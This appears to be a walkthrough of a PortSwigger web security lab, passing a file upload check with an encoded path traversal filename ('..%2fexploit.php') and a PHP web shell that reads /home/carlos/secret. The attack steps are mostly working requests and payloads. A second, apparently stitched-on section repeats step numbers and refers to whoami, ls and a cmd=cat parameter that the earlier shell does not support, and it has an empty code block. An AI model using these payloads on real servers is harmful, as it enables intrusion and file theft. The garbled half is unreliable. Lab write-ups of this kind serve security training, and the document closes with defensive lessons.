## 4. Official Burp Suite Solution

### Step 1: Log In and Upload an Image

Log in to the account using the provided credentials.

Upload an image as your avatar, then return to your account page.

### Step 2: Inspect the GET Request

Open Burp Suite and navigate to:

`Proxy > HTTP history`

Find the request used to retrieve the uploaded image:

`GET /files/avatars/<YOUR-IMAGE>`

Send this request to **Burp Repeater**.

### Step 3: Create a PHP Web Shell

Create a file named `exploit.php`.

The file should contain the following PHP code:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

This script reads the contents of Carlos's secret file and displays them when executed by the server.

### Step 4: Upload the PHP File

Upload `exploit.php` as your avatar.

Notice that the website allows the PHP file to be uploaded.

### Step 5: Test PHP Execution

In Burp Repeater, open the previously captured GET request.

Replace the image filename with `exploit.php`.

```http
GET /files/avatars/exploit.php HTTP/1.1
```

Send the request.

**Observation:**

The server returns the PHP source code as plain text instead of executing it.

This indicates that PHP execution is disabled in the avatar upload directory.

### Step 6: Find the POST Request

Go back to:

`Proxy > HTTP history`

Locate the following upload request:

```http
POST /my-account/avatar HTTP/1.1
```

Send this request to **Burp Repeater**.

### Step 7: Modify the Filename

Find the `Content-Disposition` header responsible for the uploaded file.

Change the filename to:

```http
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

Send the request.

**Observation:**

The server responds with:

`The file avatars/exploit.php has been uploaded.`

This suggests that the directory traversal sequence was removed or normalized.

### Step 8: Encode the Directory Traversal

Instead of using:

`../`

Use the URL-encoded forward slash:

`..%2f`

Change the filename to:

```http
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

### Step 9: Submit the Modified Request

Send the request using Burp Repeater.

**Observation:**

The server responds with:

`The file avatars/../exploit.php has been uploaded.`

This suggests that the encoded filename was decoded by the server and the traversal sequence affected the upload path.

### Step 10: Access the Uploaded PHP File

Return to the account page.

Find the following GET request:

```http
GET /files/avatars/..%2fexploit.php HTTP/1.1
```

The file may also be accessible using:

```http
GET /files/exploit.php HTTP/1.1
```

### Step 11: Observe the Response

Send the GET request.

The response contains Carlos's secret instead of the PHP source code.

**Explanation:**

The path traversal sequence allowed the uploaded file to be placed outside the protected avatar directory, where the server executes PHP.

### Step 12: Retrieve the Secret

Copy the secret returned by the server.

### Step 13: Complete the Lab

Submit the secret in the PortSwigger lab banner.

### Step 6: Use the PortSwigger Cheat Sheet

He opened the PortSwigger path traversal cheat sheet.

He copied the following URL-encoded traversal sequence:

`%2e%2e%2f`

**Explanation:**

- `%2e` represents `.`
- `%2f` represents `/`
- `%2e%2e%2f` represents `../`

`%2e%2e%2f`

He submitted the modified upload request.

**Observation:**

The PHP file was placed outside the original avatar directory.

The `ls` command lists files and directories on the server.

### Step 12: Read Carlos's Secret

He replaced the `whoami` command with a command intended to read Carlos's secret.

The relevant system command is:

```bash

```

`?cmd=cat+/home/carlos/secret`

**Explanation:**

The `cat` command displays the contents of a file.

The `+` represents a space when interpreted as form-style URL encoding.

The file is located at:

`/home/carlos/secret`

## 7. Key Takeaways

- File upload vulnerabilities can allow attackers to upload executable scripts.
- Preventing execution in one directory does not necessarily protect other directories.
- Path traversal can allow files to be uploaded outside their intended directory.
- URL encoding can sometimes bypass poorly implemented filename filters.
- Burp Repeater is useful for modifying HTTP requests and examining server responses.
- PHP web shells can be used to execute system commands when the server permits their execution.
- Proper file upload validation, safe filename handling, and storage outside executable directories are important security controls.
